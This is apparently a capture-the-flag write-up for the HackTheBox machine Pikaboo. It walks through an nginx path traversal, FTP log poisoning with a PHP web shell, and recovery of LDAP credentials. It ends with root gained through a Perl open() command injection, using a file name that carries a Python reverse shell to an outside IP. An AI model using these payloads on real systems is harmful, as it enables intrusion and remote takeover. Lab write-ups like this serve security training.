# HackTheBox-Pikaboo

## NMAP

```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:                                                            
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAgG6pLBPMmXneLGYurX9xbt6cE2IYdEN9J/ijCVrQbpUyVeTNWNoFnpB8+DIcppOtsJu0X3Iwpfb1eTmuop8q9nNlmyOcOTBHYOYLQwa+G4
e90Bsku86ndqs+LU09sjqss5n3XdZoFqunNfZb7EirVVCgI80Lf8F+3XRRIX3ErqNrk2LiaQQY6fcAaNALaQy9ked7KydWDFYizO2dnu8ee2ncdXFMBeVDKGVfrlHAoRFoTmCEljCP1Vsjt69NDB
udCGJBgU1MbItTF7DtbNQWGQmw8/9n9Jq8ic/YxOnIKRDDUuuWdE3sy2dPiw0ZVuG7V2GnkkMsGv0Qn3Uq9Qx7
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIJl6Z/XtGXJwSnO57P3CesJfRbmGNra4AuSSHCGUocKchdp3JnNE704lMnocAevDwi9HsAKAR
xCup18UpPHz+I=
|   256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINyHVcrR4jjhBG5vZsvKRsKO4SnXj3GqeMtwvFSvd4B4
80/tcp open  http    syn-ack ttl 63 nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


## PORT 80 (HTTP)

<img src="https://imgur.com/DJu1bKT.png"/>

We have three links on the home page on navigation bar , `Pokeatdex` , `Contact` and `Admin` so first let's visit what's the pokatdex is about 

<img src="https://i.imgur.com/e09Q4mc.png"/>

We can see some pokemon thingys over here and on hovering on the name we can see that it will take to us on `pokeapi.php`

<img src="https://i.imgur.com/3p4zHxo.png"/>

There's a GET parameter named `id` here so we can try running `sqlmap` here

<img src="https://i.imgur.com/eRcE1OA.png"/>

<img src="https://i.imgur.com/fCQmwdQ.png"/>

This failed so maybe there's no sqli on here , moving forward there's a contact page

<img src="https://i.imgur.com/vYdZstl.png"/>

I tried clicking on send button but it didn't work probably there wasn't any implementation done on this page, so we are only left with the admin page

<img src="https://i.imgur.com/DSscBgR.png"/>

We see that it asks us for a password , we could try some default one's admin:admin , admin:password , admin:Password123, none of them worked but I did notice something strange about the error message

<img src="https://i.imgur.com/WjJybFb.png"/>

That page is being hosted from Apache and the nmap scan showed us that port 80 is using nginx so nginx is being used as a reverse proxy here and we can abuse knowing that there's nginx reverse proxy mapping which could allow us to do directory traversal

https://book.hacktricks.xyz/pentesting/pentesting-web/nginx

<img src="https://i.imgur.com/OlGCqcO.png"/>

<img src="https://i.imgur.com/CXwsMZx.png"/>

So let's try if we can bypass to do LFI

<img src="https://i.imgur.com/0vxwSZb.png"/>

We get a 403 forbidden error means that directory listing isn't avilable but we can try to access a file in there or another folder that we have rights so , let's use `ffuf` to fuzz for files or directories, one thing note that when I git cloned `ffuf` from main branch I faced issues and was giving false positive reults so I switched the branch to dev and then cloned it , that worked perfectly for me

<img src="https://i.imgur.com/8TtqEEE.png"/>

Here we found `server-status` which monitors the load on the server and thells about the incoming requets on the web server through an HTML page

<img src="https://i.imgur.com/dQNQOPY.png"/>

We can see a request to `admin_staging`  in which `index.php` has parameter which is viewing the vsftpd logs which are bascially ftp login logs which means that we can poison thses logs to get remote code execution

<img src="https://i.imgur.com/50DhESe.png"/>

https://secnhack.in/ftp-log-poisoning-through-lfi/

So first we need to login with a name having a php command which will be having a GET parameter being executed as a system command

```
<?php system($_GET['cmd']);?>
```

<img src="https://i.imgur.com/EaL6B6E.png"/>

Now adding `cmd` argument with a php reverse shell command we can get a shell

<img src="https://i.imgur.com/uwj3vZ5.png"/>

We can stabilize our shell in this way ,so that we can have the functionality of clearing the terminal screen and navigating through bash history with up and down arrow keys

<img src="https://i.imgur.com/PVT7lQY.png"/>

Let's do some basic enumeration by looking at local ports

<img src="https://imgur.com/HwXl1bv.png"/>

Here we see only port 398 and 81 , 389 seems intersting as we already know about port 81 that it's using apache

Looking at running cronjobs we do see one , which is being ran by root every minute

<img src="https://i.imgur.com/lYJBz4Q.png"/>

<img src="https://imgur.com/gTQ6RpA.png"/>

The script is running a for loop which grabs the all the folders in `ftp` folder and will run a perl script on only those files which have `.csv` file extension after that those files will be removed , if we look into ftp folder we don't have permissions 

<img src="https://i.imgur.com/b92gSJV.png"/>

So doing some more enumeration, In the `/opt` directory we can see a folder 

<img src="https://i.imgur.com/UDAzCLX.png"/>

Further going into `/config/settings.py` we can find LDAP credentials 

<img src="https://i.imgur.com/XqRmiLz.png"/>

We can run this LDAP command to query everything from the machine 

```
ldapsearch -x -LLL -h localhost -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w "J~42%W?PFHl]g"  -b "dc=pikaboo,dc
=htb"
```

<img src="https://imgur.com/giqZYFz.png"/>

<img src="https://imgur.com/iLi5C4c.png"/>

Here we have to base64 encoded passwords on decoding it to text form we can get pwnmeow's password

<img src="https://imgur.com/UJdVPIt.png"/>

I tried the password on ssh , through switching user but didn't worked on them , but it did worked on ftp

<img src="https://imgur.com/hG6HS1D.png"/>

Looking at that perl script

<img src="https://imgur.com/HAtqgjH.png"/>

<img src="https://i.imgur.com/MOU64na.png"/>

For getting root , we can see that the perl script which is `csvupdate` is being ran on the files that are in FTP folders which will run on the file having `.csv` extension , there's function in the perl script `open()` which is vulnerable to command injection if we supply the commands as file name with `|` as a prefix  , so we need to upload a python reverse shell in the form of a file name.


```bash
"|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.116",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'; .csv"
```

<img src="https://i.imgur.com/Fp900Up.png"/>

<img src="https://i.imgur.com/c9pK4gm.png"/>
